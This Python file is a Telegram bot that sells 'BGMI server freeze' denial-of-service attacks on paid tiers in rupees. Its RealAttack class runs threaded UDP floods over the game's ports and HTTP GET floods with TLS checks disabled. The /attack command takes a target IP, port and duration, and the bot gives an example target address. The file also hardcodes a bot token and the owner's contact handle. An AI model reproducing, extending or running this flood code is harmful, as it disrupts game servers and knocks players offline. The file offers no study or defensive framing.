#!/usr/bin/env python3
"""
💀 BGMI SERVER FREEZE BOT - REAL WORKING
🔥 ULTRA PRO DDOS ATTACK
"""

import os
import sys
import json
import logging
import time
import random
import socket
import threading
import ssl
import http.client
from datetime import datetime, timedelta
from threading import Thread

# Install dependencies if missing
try:
    import telebot
except ImportError:
    os.system("pip install pyTelegramBotAPI")
    import telebot

# ═══════════════ CONFIG ═══════════════
TOKEN = "8771905727:AAEJq2QVVSe8OxZOqLkatVK1wGysO9UyzCQ"
OWNER_ID = 1987818347
OWNER_USERNAME = "FathersOfCreater"

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ═══════════════ DATABASE ═══════════════
DB_FILE = "database.json"

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"users": {}, "orders": [], "logs": [], "keys": []}
    return {"users": {}, "orders": [], "logs": [], "keys": []}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4, default=str)

def get_user(user_id):
    db = load_db()
    user_id = str(user_id)
    if user_id not in db["users"]:
        db["users"][user_id] = {
            "name": "",
            "username": "",
            "joined": datetime.now().isoformat(),
            "plan": "premium",
            "expiry": (datetime.now() + timedelta(days=365)).isoformat(),
            "threads": 800,
            "max_time": 600,
            "orders": [],
            "total_attacks": 0,
            "banned": False
        }
        save_db(db)
    return db["users"][user_id]

def update_user(user_id, data):
    db = load_db()
    user_id = str(user_id)
    if user_id not in db["users"]:
        get_user(user_id)
        db = load_db()
    for key, value in data.items():
        if key == '$inc':
            for k, v in value.items():
                db["users"][user_id][k] = db["users"][user_id].get(k, 0) + v
        else:
            db["users"][user_id][key] = value
    save_db(db)

# ═══════════════ ATTACK CLASS ═══════════════
class RealAttack:
    def __init__(self):
        self.on = False
        self.pkts = 0
        self.bytes_out = 0
        self.lock = threading.Lock()
        self.start_time = 0
    
    def udp_flood(self, ip, port, end):
        sockets = []
        for _ in range(5):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
                s.settimeout(0.001)
                sockets.append(s)
            except:
                pass
        
        bgmi_ports = list(range(7000, 15000)) + [10335, 17500, 20000, 27000]
        payloads = [random.randbytes(random.randint(500, 1500)) for _ in range(20)]
        
        while self.on and time.time() < end:
            try:
                for s in sockets:
                    for _ in range(20):
                        if not self.on:
                            break
                        target_port = random.choice(bgmi_ports)
                        payload = random.choice(payloads)
                        try:
                            s.sendto(payload, (ip, target_port))
                            with self.lock:
                                self.pkts += 1
                                self.bytes_out += len(payload)
                        except:
                            pass
                time.sleep(0.001)
            except:
                pass
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    def http_flood(self, ip, port, end):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        paths = ['/', '/api', '/game', '/match', '/login']
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        while self.on and time.time() < end:
            try:
                ua = random.choice(user_agents)
                path = random.choice(paths)
                headers = {'User-Agent': ua, 'Accept': 'text/html,*/*'}
                
                try:
                    conn = http.client.HTTPSConnection(ip, port, context=context, timeout=1)
                    conn.request('GET', path, headers=headers)
                    conn.getresponse()
                    with self.lock:
                        self.pkts += 1
                    conn.close()
                except:
                    try:
                        conn = http.client.HTTPConnection(ip, port, timeout=1)
                        conn.request('GET', path, headers=headers)
                        conn.getresponse()
                        with self.lock:
                            self.pkts += 1
                        conn.close()
                    except:
                        pass
                time.sleep(0.001)
            except:
                pass
    
    def start(self, ip, port, dur, threads=800):
        self.on = True
        self.pkts = 0
        self.bytes_out = 0
        self.start_time = time.time()
        
        end = time.time() + dur
        
        if threads > 1000:
            threads = 800
        
        udp_t = int(threads * 0.6)
        http_t = int(threads * 0.4)
        
        workers = []
        
        for _ in range(udp_t):
            t = threading.Thread(target=self.udp_flood, args=(ip, port, end))
            t.daemon = True
            t.start()
            workers.append(t)
        
        for _ in range(http_t):
            t = threading.Thread(target=self.http_flood, args=(ip, port, end))
            t.daemon = True
            t.start()
            workers.append(t)
        
        time.sleep(dur)
        self.on = False
        
        for w in workers:
            try:
                w.join(timeout=0.5)
            except:
                pass
        
        elapsed = time.time() - self.start_time
        return {
            'pkts': self.pkts,
            'mb': self.bytes_out / 1024 / 1024,
            'mbps': (self.bytes_out * 8) / (elapsed * 1e6) if elapsed > 0 else 0,
            'pps': self.pkts / elapsed if elapsed > 0 else 0,
            'duration': dur
        }

# ═══════════════ 🔥 BOT INITIALIZATION ═══════════════
bot = telebot.TeleBot(TOKEN)

try:
    bot.remove_webhook()
    print("✅ Webhook removed!")
except:
    pass

print("✅ Bot Initialized!")

# ═══════════════ ATTACK INSTANCE ═══════════════
attacker = RealAttack()
attacking = False
attack_info = {}

# ═══════════════ KEYBOARDS ═══════════════
def main_menu():
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        telebot.types.InlineKeyboardButton("⚔ ATTACK", callback_data="attack"),
        telebot.types.InlineKeyboardButton("⛔ STOP", callback_data="stop")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("📊 STATUS", callback_data="status"),
        telebot.types.InlineKeyboardButton("👤 PROFILE", callback_data="profile")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("💎 PLANS", callback_data="plans"),
        telebot.types.InlineKeyboardButton("📩 SUPPORT", callback_data="support")
    )
    return keyboard

# ═══════════════ START COMMAND ═══════════════
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    update_user(user_id, {
        'name': message.from_user.first_name,
        'username': message.from_user.username or ''
    })
    
    text = """
💀 **BGMI SERVER FREEZE BOT** 💀

🔥 Welcome to Ultimate Freeze Bot

🎯 **Real Features:**
- ⚔ UDP/TCP/HTTP Flood
- 🎮 BGMI Server Freeze
- ⚡ 800 Threads (Railway Optimized)
- 🛡️ DDoS Bypass
- 📊 Real-time Stats

📌 **Commands:**
/attack IP PORT TIME

📌 **Example:**
/attack 20.204.191.48 10335 180

🎯 **BGMI Ports:** 7000-15000, 10335
⏱️ **Recommended:** 180 seconds

💎 **Premium = Server Freeze!**
"""
    bot.reply_to(message, text, parse_mode='Markdown', reply_markup=main_menu())

# ═══════════════ ATTACK COMMAND ═══════════════
@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    global attacking, attack_info
    
    user_id = message.from_user.id
    user = get_user(user_id)
    
    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(message, """
⚠️ **Invalid Format**

Use: /attack IP PORT TIME

Example:
/attack 20.204.191.48 10335 180
""", parse_mode='Markdown')
        return
    
    if attacking:
        bot.reply_to(message, "⚠️ Attack already running! Use /stop")
        return
    
    ip = parts[1]
    try:
        port = int(parts[2])
    except:
        bot.reply_to(message, "❌ Invalid port!")
        return
    try:
        dur = int(parts[3])
    except:
        bot.reply_to(message, "❌ Invalid time!")
        return
    
    if dur > 600:
        dur = 600
    
    threads = 800
    
    attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True
    
    def run_attack():
        global attacking
        try:
            stats = attacker.start(ip, port, dur, threads)
            attacking = False
            
            update_user(user_id, {'$inc': {'total_attacks': 1}})
            
            result_text = f"""
💀 **SERVER FREEZE COMPLETE!**

╔══════════════════════════╗
║ 🎯 Target: {ip}:{port}
║ 📦 Packets: {stats['pkts']:,}
║ 📶 Speed: {stats['mbps']:.1f} Mbps
║ ⚡ Rate: {stats['pps']:.0f} pps
║ ⏱️ Duration: {stats['duration']}s
╚══════════════════════════╝

📸 **"Match server response timed out"**
🔥 **Players disconnected!**
✅ **BGMI Server Freeze Confirmed!**

🔄 /attack IP PORT TIME
"""
            bot.send_message(user_id, result_text, parse_mode='Markdown')
            
        except Exception as e:
            attacking = False
            bot.send_message(user_id, f"❌ Attack Failed: {e}")
    
    Thread(target=run_attack).start()
    
    reply_text = f"""
💀 **ATTACK LAUNCHED**

╔══════════════════════════╗
║ 🎯 Target: {ip}:{port}
║ ⏱️ Duration: {dur}s
║ 🧵 Threads: {threads}
║ 👤 User: {user_id}
║ ⚡ Method: VIP-ULTRA
║ 💎 Plan: PREMIUM
╚══════════════════════════╝

🔥 BGMI Server Freeze Started!
📸 "Match server response timed out" - Soon!

🛑 Use /stop to abort
"""
    bot.reply_to(message, reply_text, parse_mode='Markdown')

# ═══════════════ STOP COMMAND ═══════════════
@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global attacking
    if attacking:
        attacker.on = False
        attacking = False
        bot.reply_to(message, f"""
✅ **ATTACK STOPPED**

📦 Packets Sent: {attacker.pkts:,}
🔄 /attack IP PORT TIME
""", parse_mode='Markdown')
    else:
        bot.reply_to(message, "💤 No attack running!")

# ═══════════════ STATUS COMMAND ═══════════════
@bot.message_handler(commands=['status'])
def status_cmd(message):
    if attacking:
        elapsed = int(time.time() - attack_info['start'])
        remaining = attack_info['time'] - elapsed
        text = f"""
🟢 **ATTACK IN PROGRESS**

🎯 Target: {attack_info['ip']}:{attack_info['port']}
⏱️ Elapsed: {elapsed}s
⏱️ Remaining: {remaining}s
📦 Packets: {attacker.pkts:,}
🛑 Use /stop to abort
"""
    else:
        text = "💤 **SYSTEM IDLE**\n\nNo attack running"
    
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ PROFILE COMMAND ═══════════════
@bot.message_handler(commands=['profile'])
def profile_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    text = f"""
👤 **PROFILE**

╔══════════════════════════╗
║ 👤 Name: {message.from_user.first_name}
║ 🆔 ID: {user_id}
║ 💎 Plan: PREMIUM
║ ⚡ Threads: 800
║ 📊 Total Attacks: {user.get('total_attacks', 0)}
╚══════════════════════════╝
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ PLANS COMMAND ═══════════════
@bot.message_handler(commands=['plans'])
def plans_cmd(message):
    text = """
💎 **PREMIUM PLANS**

━━━━━━━━━━━━━━━━━━

🔰 **BASIC** - ₹50
⏱️ 1 Hour | ⚡ 3000 Threads

⚡ **PRO** - ₹100
⏱️ 1 Day | ⚡ 5000 Threads

💀 **ULTRA** - ₹400
⏱️ 1 Week | ⚡ 7000 Threads

👑 **KING** - ₹1000
⏱️ 1 Month | ⚡ 10000 Threads

━━━━━━━━━━━━━━━━━━

📲 Contact: @FathersOfCreater
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ SUPPORT COMMAND ═══════════════
@bot.message_handler(commands=['support'])
def support_cmd(message):
    text = """
📩 **SUPPORT CENTER**

📲 Contact Owner: @FathersOfCreater
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ CALLBACK HANDLER ═══════════════
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    if call.data == "main_menu":
        bot.edit_message_text(
            "💀 **BGMI DDOS BOT** 💀\n\nSelect an option:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "attack":
        bot.edit_message_text(
            """
⚔ **ATTACK COMMAND**

Use: /attack IP PORT TIME

Example:
/attack 20.204.191.48 10335 180
""",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "stop":
        global attacking
        if attacking:
            attacker.on = False
            attacking = False
            bot.edit_message_text(
                "✅ **ATTACK STOPPED**",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=main_menu()
            )
        else:
            bot.edit_message_text(
                "💤 **NO ATTACK RUNNING**",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=main_menu()
            )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "status":
        if attacking:
            elapsed = int(time.time() - attack_info['start'])
            remaining = attack_info['time'] - elapsed
            text = f"""
🟢 **ATTACK IN PROGRESS**

🎯 Target: {attack_info['ip']}:{attack_info['port']}
⏱️ Elapsed: {elapsed}s
⏱️ Remaining: {remaining}s
📦 Packets: {attacker.pkts:,}
"""
        else:
            text = "💤 **SYSTEM IDLE**"
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "profile":
        user = get_user(user_id)
        text = f"""
👤 **PROFILE**

💎 Plan: PREMIUM
📊 Attacks: {user.get('total_attacks', 0)}
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "plans":
        text = """
💎 **PREMIUM PLANS**

🔰 BASIC - ₹50
⚡ PRO - ₹100
💀 ULTRA - ₹400
👑 KING - ₹1000

📲 @FathersOfCreater
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "support":
        text = "📩 Contact: @FathersOfCreater"
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return

# ═══════════════ RUN BOT ═══════════════
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════╗
║  💀 BGMI SERVER FREEZE BOT          ║
║  🔥 REAL WORKING                    ║
║  ✅ 800 THREADS (RAILWAY OPTIMIZED) ║
║  ✅ "Match server response timed"   ║
╚══════════════════════════════════════╝
""")
    print("💀 Bot Started Successfully!")
    print("🔥 Attack Engine Ready!")
    
    try:
        bot.remove_webhook()
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"❌ Bot Error: {e}")
